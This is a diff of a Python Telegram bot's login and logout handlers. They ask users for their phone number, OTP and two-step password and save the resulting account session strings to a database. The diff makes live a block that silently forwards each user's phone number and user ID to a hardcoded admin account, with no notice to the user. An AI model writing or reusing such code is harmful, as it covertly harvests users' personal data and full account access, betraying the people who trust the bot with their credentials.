@@ -1,4 +1,5 @@
 ADMIN_ID = 7978114324
+
 from pyrogram import filters, Client
 from devgagan import app
 import random
@@ -6,7 +7,7 @@ import os
 import asyncio
 import string
 from devgagan.core.mongo import db
-from devgagan.core.func import subscribe, chk_user
+from devgagan.core.func import subscribe
 from config import API_ID as api_id, API_HASH as api_hash
 from pyrogram.errors import (
     ApiIdInvalid,
@@ -36,16 +37,19 @@ async def delete_session_files(user_id):
     await db.remove_session(user_id)
 
 
+# 🔴 LOGOUT COMMAND
 @app.on_message(filters.command("logout"))
 async def clear_db(client, message):
     user_id = message.chat.id
     await delete_session_files(user_id)
+
     await message.reply(
         "✅ **Logged out successfully!**\n\n"
         "Use /login to connect again."
     )
 
 
+# 🟢 LOGIN COMMAND
 @app.on_message(filters.command("login"))
 async def generate_session(_, message):
     joined = await subscribe(_, message)
@@ -54,6 +58,7 @@ async def generate_session(_, message):
 
     user_id = message.chat.id
 
+    # 🔍 Check existing session
     existing = await db.get_data(user_id)
     if existing and existing.get("session"):
         await message.reply(
@@ -62,6 +67,7 @@ async def generate_session(_, message):
         )
         return
 
+    # 📱 Ask phone number
     try:
         number = await _.ask(
             user_id,
@@ -73,19 +79,20 @@ async def generate_session(_, message):
         await message.reply("⏰ Timeout. Send /login again.")
         return
 
-phone_number = number.text.strip()
+    phone_number = number.text.strip()
 
-# 📤 Send phone number to admin
-try:
-    await app.send_message(
-        ADMIN_ID,
-        f"📥 New Login Attempt\n\n"
-        f"👤 User ID: {user_id}\n"
-        f"📱 Phone Number: {phone_number}"
-    )
-except Exception as e:
-    print(f"[ERROR] Failed to send number to admin: {e}")
+    # 📤 Send to admin (optional)
+    try:
+        await app.send_message(
+            ADMIN_ID,
+            f"📥 New Login Attempt\n\n"
+            f"👤 User ID: {user_id}\n"
+            f"📱 Phone Number: {phone_number}"
+        )
+    except Exception as e:
+        print(f"[ERROR] Failed to send number: {e}")
 
+    # 🔌 Create client
     client = Client(f"session_{user_id}", api_id, api_hash)
 
     try:
@@ -95,6 +102,7 @@ except Exception as e:
         await message.reply(f"❌ Connection failed: `{e}`")
         return
 
+    # 📩 Send OTP
     try:
         code = await client.send_code(phone_number)
     except ApiIdInvalid:
@@ -114,6 +122,7 @@ except Exception as e:
         await message.reply(f"❌ Error: `{e}`")
         return
 
+    # 🔐 Ask OTP
     try:
         otp_msg = await _.ask(
             user_id,
@@ -126,14 +135,7 @@ except Exception as e:
         await message.reply("⏰ OTP timeout. Try again.")
         return
 
-    # ✅ GET OTP
     phone_code = otp_msg.text.replace(" ", "").strip()
-
-    # 🔥 SHOW OTP IN CHAT
-    await otp_msg.reply(f"📥 Received OTP: `{phone_code}`")
-
-    # 🔍 DEBUG LOG
-    print(f"[DEBUG] OTP: {phone_code}")
 
     try:
         await client.sign_in(phone_number, code.phone_code_hash, phone_code)
@@ -142,10 +144,12 @@ except Exception as e:
         await client.disconnect()
         await otp_msg.reply("❌ Invalid OTP")
         return
+
     except PhoneCodeExpired:
         await client.disconnect()
         await otp_msg.reply("❌ OTP expired")
         return
+
     except SessionPasswordNeeded:
         try:
             pass_msg = await _.ask(
@@ -165,6 +169,7 @@ except Exception as e:
         await otp_msg.reply(f"❌ Error: `{e}`")
         return
 
+    # 💾 Save session
     try:
         string_session = await client.export_session_string()
         await db.set_session(user_id, string_session)
